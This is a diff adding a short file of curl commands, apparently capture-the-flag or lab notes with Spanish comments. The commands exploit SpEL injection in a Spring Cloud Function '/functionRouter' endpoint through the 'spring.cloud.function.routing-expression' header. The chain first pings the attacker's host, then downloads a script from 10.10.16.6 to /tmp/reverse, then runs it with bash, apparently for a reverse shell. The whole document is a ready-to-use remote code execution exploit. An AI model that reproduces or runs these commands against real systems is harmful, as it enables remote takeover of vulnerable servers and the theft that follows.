@@ -1,0 +1,7 @@
+curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 10.10.16.6"))' -d '.'
+
+### guardas el bash de index.html 
+curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.6 -o /tmp/reverse")' -d '.'
+
+### Intrerpretas con bash 
+curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse")' -d '.'
